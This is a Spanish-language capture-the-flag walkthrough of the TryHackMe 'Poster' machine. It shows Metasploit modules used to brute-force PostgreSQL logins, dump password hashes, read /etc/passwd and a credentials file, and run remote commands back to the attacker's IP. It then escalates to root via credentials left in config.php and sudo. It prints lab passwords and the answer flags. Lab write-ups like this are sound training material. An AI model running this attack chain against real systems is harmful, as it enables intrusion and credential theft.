## **Tutorial: Explotación de la máquina Poster en TryHackMe**


## 1. Conexión a la VPN de TryHackMe

Para poder acceder a las máquinas del laboratorio es necesario conectarse primero a la VPN de TryHackMe. Esto crea un túnel cifrado entre la máquina Kali y la red privada del laboratorio.

### 1.1 Conexión mediante OpenVPN

Desde la terminal de Kali ejecutamos el siguiente comando utilizando el archivo .ovpn descargado desde la plataforma:

```bash
sudo openvpn /home/nerea/Descargas/eu-central-1-nereacandonramos-regular.ovpn
```
Si este no funciona, probar el west-3-
Si la conexión se establece correctamente aparecerá el mensaje:

```bash
Initialization Sequence Completed
```

Esto indica que la VPN se ha establecido correctamente.

### 1.2 Verificación de la conexión

Para comprobar que la conexión está activa ejecutamos:

```bash
ip a
```

Esto mostrará una interfaz de red llamada tun0, que corresponde a la conexión VPN con TryHackMe.

## 2. Escaneo de puertos con Nmap

El siguiente paso consiste en identificar los servicios expuestos en la máquina objetivo utilizando Nmap, una herramienta fundamental para el reconocimiento en auditorías de seguridad.

Se ejecuta el siguiente comando:

Escaneo completo de puertos:

```bash
nmap -sC -sV -p- 10.128.165.36
```

![nmap](Maquina_de_Linux/Poster/imagenes/nmap.png)

Esto te dice:

Puertos abiertos
Servicios
Versiones (clave para exploits)


## 3. Enumeración y ataque a PostgreSQL

Abrimos la consola 

msfconsole

![nmap](Maquina_de_Linux/Poster/imagenes/msf.png)

Ya dentro de Metasploit Framework, seleccionamos el módulo:

Buscamos con search el módulo que queremos

![search](Maquina_de_Linux/Poster/imagenes/search.png)


```bash
use 7
```


Esto carga:

```bash
auxiliary/scanner/postgres/postgres_login
```

Este módulo sirve para:

- probar usuarios y contraseñas de PostgreSQL
- automatizar fuerza bruta
- encontrar credenciales válidas

### 3.1 Configuración del módulo

Ahora hay que configurar los parámetros básicos.

Ver opciones disponibles

```bash
show options
```

Configurar IP objetivo

```bash
set RHOSTS 10.128.162.111
```
RHOSTS = máquina víctima

![use](Maquina_de_Linux/Poster/imagenes/login.png)

### 3.2 Ejecución del ataque

Después de poner el setRHOST le damos a:

```bash
run
```
Resultado esperado:

```bash
 10.128.162.111:5432 - Login Successful: postgres:password@template1
 ```

### 3.3 Explotación del acceso a PostgreSQL mediante consultas SQL

Una vez obtenidas las credenciales válidas del servicio PostgreSQL (postgres:password), se procede a aprovechar este acceso utilizando un módulo de Metasploit que permite ejecutar consultas SQL directamente sobre la base de datos.

Para ello, se carga el siguiente módulo:

```bash
use auxiliary/admin/postgres/postgres_sql
```

Configuración del módulo

Se configuran los parámetros necesarios:

```bash
set RHOSTS 10.128.162.111
set USERNAME postgres
set PASSWORD password
```

Despues de colocar todo le damos a:

```bash
run
```

![use](Maquina_de_Linux/Poster/imagenes/use.png)

Al ejecutar el módulo también se obtuvo la versión del servidor PostgreSQL (PostgreSQL X.Y.Z). Disponer de este dato es importante, ya que permite analizar si esa versión concreta presenta vulnerabilidades conocidas (CVE), configuraciones por defecto inseguras o características específicas que puedan facilitar fases posteriores del ataque, como la enumeración avanzada o la explotación del sistema.

Con la versión de PostgreSQL identificada, se procedió a buscar en Metasploit módulos que permitieran obtener información de autenticación, como hashes de contraseñas almacenados en la base de datos. Para ello, dentro de msfconsole se exploraron módulos auxiliares relacionados con PostgreSQL utilizando términos como hash, dump o auth.


### 3.4 Extracción de hashes de contraseñas con Metasploit

Una vez obtenido acceso al servicio PostgreSQL y tras realizar la enumeración básica, el siguiente paso consiste en extraer los hashes de contraseñas almacenados en la base de datos. Esto permite obtener credenciales que pueden ser reutilizadas directamente o descifradas posteriormente.

Para ello, se utiliza el siguiente módulo de Metasploit:

```bash
use auxiliary/scanner/postgres/postgres_hashdump
```

Configuración del módulo

Se configuran los parámetros necesarios utilizando las credenciales previamente obtenidas:

```bash
set RHOSTS 10.128.162.111
set USERNAME postgres
set PASSWORD password
```

![use](Maquina_de_Linux/Poster/imagenes/hash.png)

Ejecución del módulo

Una vez configurado, se lanza el módulo:

```bash
run
```

### 3.5 Lectura de archivos del sistema mediante PostgreSQL

Una vez obtenidas credenciales válidas y acceso al servicio PostgreSQL, es posible intentar leer archivos del sistema directamente desde la base de datos. Esto se realiza aprovechando funciones internas de PostgreSQL que permiten acceder al sistema de ficheros del servidor.

Para ello, se utiliza el siguiente módulo de Metasploit:

```bash
use auxiliary/admin/postgres/postgres_readfile
```

Configuración del módulo

Se configuran los parámetros necesarios utilizando las credenciales previamente obtenidas:

```bash
set RHOSTS 10.128.162.111
set USERNAME postgres
set PASSWORD password
```

![use](Maquina_de_Linux/Poster/imagenes/use2.png)

Ejecución del módulo

Una vez configurado, se lanza el módulo:

```bash
run
```

Después de ejecutar el comando auxiliar, obtuve el contenido de /etc/passwd.


### 3.6 Análisis de usuarios del sistema

Tras ejecutar el módulo postgres_readfile sobre el archivo /etc/passwd, se obtuvo un listado de los usuarios existentes en el sistema.

Entre los resultados destacan los siguientes:

```bash
/home/dark/credentials.txt
```
![creden](Maquina_de_Linux/Poster/imagenes/creden.png)

### 3.7 Descubrimiento de credenciales

A continuación, se utilizó nuevamente el módulo postgres_readfile, esta vez para intentar leer archivos dentro de los directorios de los usuarios.

Se identificó un archivo interesante:

```bash
set RFILE /home/dark/credentials.txt
run
```

Resultado obtenido

```bash
dark:qwerty1234#!hackme
```

![rfile](Maquina_de_Linux/Poster/imagenes/rfile.png)


## 4. Ejecución remota de comandos mediante PostgreSQL (RCE)

Tras autenticarse correctamente en el servicio PostgreSQL y realizar la enumeración de archivos, el siguiente paso consiste en obtener ejecución remota de comandos en el sistema objetivo.

Para ello, se utiliza un módulo de Metasploit que permite a un usuario autenticado de PostgreSQL ejecutar comandos arbitrarios en el sistema operativo aprovechando funcionalidades internas del servicio.


**Búsqueda del módulo**

Dentro de msfconsole, se realiza una búsqueda de exploits relacionados con PostgreSQL:

```bash
search type:exploit postgres
```

**Selección del módulo**

Se selecciona el módulo más adecuado:

```bash
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```

Este módulo permite ejecutar comandos del sistema a través de PostgreSQL.


**Configuración del módulo**

Se configuran los parámetros necesarios:

```bash
set RHOSTS 10.128.162.111
set USERNAME postgres
set PASSWORD password
set LHOST 192.168.142.53
```

![use](Maquina_de_Linux/Poster/imagenes/use3.png)

Donde:

```bash
RHOSTS → máquina víctima
LHOST → IP de Kali (tu máquina)
```

Ejecución del exploit

```bash
run
```


## 5. Acceso SSH como dark

Ejecuta esto en tu Kali:

```bash
ssh dark@10.128.162.111
```

Cuando pida contraseña:

```bash
qwerty1234#!hackme
```
![ssh](Maquina_de_Linux/Poster/imagenes/ssh.png)

Si funciona, veremos:

```bash
~$
```

Ya estamos dentro del sistema “bien” (no vía exploit)


## 6. Enumeración básica (dentro de SSH)

Ahora haz esto:

```bash
whoami
id
ls -la
```

**Enumeración de usuarios**

Para identificar otros usuarios del sistema:

```bash
ls /home
```

Salida esperada:

```bash
alison  dark
```

![alison](Maquina_de_Linux/Poster/imagenes/alison.png)

Esto indica que existe otro usuario potencialmente interesante: alison


**Comprobación de privilegios**

Se revisan los permisos sudo del usuario actual:

```bash
sudo -l
```

Resultado:

```bash
Sorry, user dark may not run sudo on ubuntu.
```

El usuario dark no tiene privilegios administrativos, por lo que es necesario buscar otra vía de escalada.


## 7. Búsqueda de credenciales en el sistema

Se procede a explorar archivos en busca de credenciales almacenadas de forma insegura.

Acceso al directorio web

```bash
cd /var/www/html
ls
```

Salida:

```bash
config.php  poster
```


Lectura del archivo de configuración

```bash
cat config.php
```

Contenido relevante:

```bash
$dbuname = "alison";
$dbpass = "p4ssw0rdS3cur3!#";
```

![cd](Maquina_de_Linux/Poster/imagenes/cat.png)

Se identifican credenciales en texto plano del usuario alison


## 8. Escalada a usuario alison

Se utiliza la contraseña encontrada para cambiar de usuario:

```bash
su alison
```

Se introduce la contraseña:

```bash
p4ssw0rdS3cur3!#
```
Acceso exitoso como alison


## 9. Escalada de privilegios a root

Verificación de permisos

```bash
sudo -l
```

Resultado:

```bash
(ALL : ALL) ALL
```

![ssh](Maquina_de_Linux/Poster/imagenes/sudo.png)

El usuario alison puede ejecutar cualquier comando como root.


**Obtención de root**

```bash
sudo su
```

Verificación:

```bash
whoami
```

Salida:

```bash
root
```

![sudo](Maquina_de_Linux/Poster/imagenes/root.png)

Acceso total al sistema


## 10 .User flag

Normalmente está en el home del usuario (alison o dark).

Prueba:

```bash
cd /home
ls
```

Luego:

```bash
cd alison
ls
```

Busca algo como:

```bash
user.txt
```

Y léelo:

```bash
cat user.txt
```

El resultado es:

```bash
THM{postgresql_fa1l_conf1gurat1on}
```
![user](Maquina_de_Linux/Poster/imagenes/user.png)


## 11.Root flag

Ahora como eres root:

```bash
cd /root
ls
```

Deberías ver:

```bash
root.txt
```

Leer:

```bash
cat root.txt
```

El resultado es:

```bash
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```

![root](Maquina_de_Linux/Poster/imagenes/root2.png)

